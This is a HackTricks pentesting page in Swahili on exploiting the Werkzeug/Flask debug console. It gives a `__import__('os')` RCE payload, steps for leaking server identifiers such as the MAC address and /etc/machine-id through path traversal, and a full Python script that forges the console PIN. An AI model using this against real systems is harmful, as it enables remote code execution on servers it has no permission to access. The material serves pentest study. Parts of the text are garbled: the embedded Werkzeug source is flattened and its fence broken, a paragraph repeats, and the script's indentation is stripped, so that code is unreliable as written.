# Werkzeug / Flask Debug

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Usanidi wa papo hapo wa upimaji wa udhaifu & uchunguzi wa kuingilia**. Tekeleza pentest kamili kutoka popote na zana na vipengele zaidi ya 20 ambavyo vinakwenda kutoka uchunguzi hadi ripoti. Hatuchukui nafasi ya wapimaji wa pentest - tunatengeneza zana za desturi, moduli za ugunduzi & uchomaji ili kuwarudishia muda wa kuchimba kwa kina, kufungua makabati, na kufurahi.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Ikiwa kurekebisha iko hai unaweza kujaribu kupata ufikivu wa `/console` na kupata RCE.

```python
__import__('os').popen('whoami').read();
```

![](<../../.gitbook/assets/image (317).png>)

Kuna pia mianya kadhaa kwenye mtandao kama [hii](https://github.com/its-arun/Werkzeug-Debug-RCE) au moja kwenye metasploit.

## Pin Iliyolindwa - Uvamizi wa Njia

Katika baadhi ya matukio, **`/console`** mwisho utalindwa na pin. Ikiwa una **mianya ya upitishaji wa faili**, unaweza kuvuja habari zote muhimu kuzalisha pin hiyo.

### Uvamizi wa PIN ya Konsoli ya Werkzeug

Lazima ulete ukurasa wa kosa la debug katika programu ili uone hili:

```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```

Ujumbe kuhusu hali ya "console imefungwa" unakutwa wakati wa kujaribu kupata ufikiaji wa interface ya uchunguzi ya Werkzeug, ukionyesha hitaji la PIN kufungua console. Sifa inapendekezwa kuchunguza PIN kwa kuchambua algorithm ya kizazi cha PIN katika faili ya uanzishaji wa uchunguzi ya Werkzeug (`__init__.py`). Mfumo wa kizazi cha PIN unaweza kusomwa kutoka kwenye [**repo ya msimbo wa chanzo cha Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), ingawa inashauriwa kupata msimbo halisi wa seva kupitia udhaifu wa upitishaji wa faili kutokana na tofauti za matoleo yanayowezekana.

Kwa kuchambua PIN ya console, seti mbili za vitu, `probably_public_bits` na `private_bits`, zinahitajika:

#### **`probably_public_bits`**

* **`username`**: Inahusu mtumiaji aliyeanzisha kikao cha Flask.
* **`modname`**: Kawaida inateuliwa kama `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Kwa kawaida inaelekeza kwa **Flask**.
* **`getattr(mod, '__file__', None)`**: Inawakilisha njia kamili ya `app.py` ndani ya saraka ya Flask (k.m., `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Ikiwa `app.py` haifai, **jaribu `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Inapata anwani ya MAC ya mashine ya sasa, na `str(uuid.getnode())` ikiiweka katika muundo wa desimali.
* Ili **kutambua anwani ya MAC ya seva**, mtu lazima aitambue kiolesura cha mtandao kinachotumiwa na programu (k.m., `ens3`). Katika hali ya kutokuwa na uhakika, **vuja `/proc/net/arp`** kwa kutafuta kitambulisho cha kifaa, kisha **chimbua anwani ya MAC** kutoka **`/sys/class/net/<kitambulisho cha kifaa>/anwani`**.
* Ubadilishaji wa anwani ya MAC ya hexadecimal kuwa desimali unaweza kufanywa kama inavyoonyeshwa hapa chini:

```python
# Mfano wa anwani ya MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```

* **`get_machine_id()`**: Inaunganisha data kutoka `/etc/machine-id` au `/proc/sys/kernel/random/boot_id` na mstari wa kwanza wa `/proc/self/cgroup` baada ya mshale wa mwisho (`/`).

<details>

<summary>Msimbo wa `get_machine_id()`</summary>

\`\`\`python def get\_machine\_id() -> t.Optional\[t.Union\[str, bytes]]: global \_machine\_id

if \_machine\_id is not None: return \_machine\_id

def \_generate() -> t.Optional\[t.Union\[str, bytes]]: linux = b""

## machine-id is stable across boots, boot\_id is not.

for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot\_id": try: with open(filename, "rb") as f: value = f.readline().strip() except OSError: continue

if value: linux += value break

## Containers share the same machine id, add some cgroup

## information. This is used outside containers too but should be

## relatively stable across boots.

try: with open("/proc/self/cgroup", "rb") as f: linux += f.readline().strip().rpartition(b"/")\[2] except OSError: pass

if linux: return linux

## On OS X, use ioreg to get the computer's serial number.

try:

````
</details>

Baada ya kukusanya data zote muhimu, script ya exploit inaweza kutekelezwa ili kuzalisha PIN ya konsoli ya Werkzeug:

Baada ya kukusanya data zote muhimu, script ya exploit inaweza kutekelezwa ili kuzalisha PIN ya konsoli ya Werkzeug. Script hutumia `probably_public_bits` na `private_bits` zilizokusanywa kuunda hash, ambayo kisha hupitia usindikaji zaidi ili kuzalisha PIN ya mwisho. Hapa chini ni msimbo wa Python wa kutekeleza mchakato huu:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
````

Hii script inazalisha PIN kwa kuhakiki bits zilizounganishwa, kuongeza salts maalum (`cookiesalt` na `pinsalt`), na kuumbua matokeo. Ni muhimu kuzingatia kuwa thamani halisi za `probably_public_bits` na `private_bits` lazima zipatikane kwa usahihi kutoka kwenye mfumo lengwa ili kuhakikisha PIN iliyozalishwa inalingana na ile inayotarajiwa na konsoli ya Werkzeug.

Ikiwa uko kwenye **toleo la zamani** la Werkzeug, jaribu kubadilisha **algorithimu ya hashing kuwa md5** badala ya sha1.

### Marejeo

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<img src="../../.gitbook/assets/image (2) (1) (1).png" alt="" data-size="original">

**Usanidi wa papo hapo wa upimaji wa udhaifu & upenyaji wa mtihani**. Tekeleza pentest kamili kutoka popote uendapo na zana na vipengele zaidi ya 20 vinavyoanzia uchunguzi hadi kuripoti. Hatuchukui nafasi ya wapimaji wa pentesting - tunatengeneza zana za desturi, moduli za ugunduzi & uchexploitation ili kuwarudishia muda wa kuchimba kwa kina, kuvunja mifumo, na kufurahi.

</details>
